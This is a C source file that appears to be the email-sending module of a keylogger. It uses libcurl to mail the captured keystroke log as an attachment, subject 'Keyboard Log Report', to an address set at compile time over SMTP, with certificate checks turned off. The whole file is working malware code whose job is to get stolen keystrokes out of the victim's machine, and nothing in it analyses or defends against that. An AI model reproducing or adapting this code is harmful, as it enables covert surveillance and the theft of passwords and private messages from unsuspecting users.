#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "utils/helpers.h"
#include "keylogger/file_handler.h"
#include "keylogger/send_email.h"


#ifndef EMAIL_USERNAME
#error "EMAIL_USERNAME is not defined"
#endif

#ifndef EMAIL_PORT
#error "EMAIL_PORT is not defined"
#endif

#ifndef EMAIL_SERVER
#error "EMAIL_SERVER is not defined"
#endif

#ifndef EMAIL_PASSWORD
#error "EMAIL_PASSWORD is not defined"
#endif

#define EMAIL_SUBJECT "Keyboard Log Report"


int EmailSender_init(EmailSender *sender) {
    sender->curl = NULL;
    sender->recipients = NULL;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    sender->curl = curl_easy_init();

    if (!sender->curl) {
        fprintf(stderr, "Failed to initialize curl\n");
        return 1;
    }

    char url[256];
    snprintf(url, sizeof(url), "smtp://%s:%d", EMAIL_SERVER, EMAIL_PORT);
    curl_easy_setopt(sender->curl, CURLOPT_URL, url);
    curl_easy_setopt(sender->curl, CURLOPT_MAIL_FROM, EMAIL_USERNAME);
    sender->recipients = curl_slist_append(sender->recipients, EMAIL_USERNAME);

    curl_easy_setopt(sender->curl, CURLOPT_MAIL_RCPT, sender->recipients);
    curl_easy_setopt(sender->curl, CURLOPT_USERNAME, EMAIL_USERNAME);
    curl_easy_setopt(sender->curl, CURLOPT_PASSWORD, EMAIL_PASSWORD);
    curl_easy_setopt(sender->curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
    curl_easy_setopt(sender->curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(sender->curl, CURLOPT_SSL_VERIFYHOST, 0L);

    return 0;
}


int send_file_via_email(EmailSender *sender, FileHandler *fh) {
     CURLcode res = CURLE_OK;
     char time_str[9];

    if (FileHandler_close(fh)) {
        fprintf(stderr, "Failed to close file before sending\n");
        return 1;
    }

    curl_mime *mime = curl_mime_init(sender->curl);
    curl_mimepart *part;

    part = curl_mime_addpart(mime);
    curl_mime_data(part, "", CURL_ZERO_TERMINATED);
    char headers[512];
    snprintf(headers, sizeof(headers),
            "From: %s\r\n"
            "To: %s\r\n"
            "Subject: %s\r\n"
            "Content-Type: multipart/mixed; boundary=frontier\r\n",
            EMAIL_USERNAME, EMAIL_USERNAME, EMAIL_SUBJECT);
    curl_mime_headers(part, curl_slist_append(NULL, headers), 1);

    part = curl_mime_addpart(mime);
    curl_mime_data(part, "Keyboard log file is attached to this email.\r\n", CURL_ZERO_TERMINATED);
    curl_mime_type(part, "text/plain");

    part = curl_mime_addpart(mime);
    curl_mime_filedata(part, FILENAME);
    curl_mime_type(part, "application/octet-stream");
    char disposition[256];
    snprintf(disposition, sizeof(disposition), "attachment; filename=\"%s\"", FILENAME);
    curl_mime_headers(part, curl_slist_append(NULL, disposition), 1);

    curl_easy_setopt(sender->curl, CURLOPT_MIMEPOST, mime);

    res = curl_easy_perform(sender->curl);
    curl_mime_free(mime);

    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    } else {
        get_current_time(time_str, sizeof(time_str));
        printf("Email sent successfully: %s\n", time_str);
    }

    if (FileHandler_init(fh)) {
        fprintf(stderr, "Failed to reopen file after sending\n");
        return 1;
    }

    return (res == CURLE_OK) ? 0 : 1;
}

void EmailSender_cleanup(EmailSender *sender) {
    if (sender->recipients) {
        curl_slist_free_all(sender->recipients);
        sender->recipients = NULL;
    }

    if (sender->curl) {
        curl_easy_cleanup(sender->curl);
        sender->curl = NULL;
    }

    curl_global_cleanup();
}
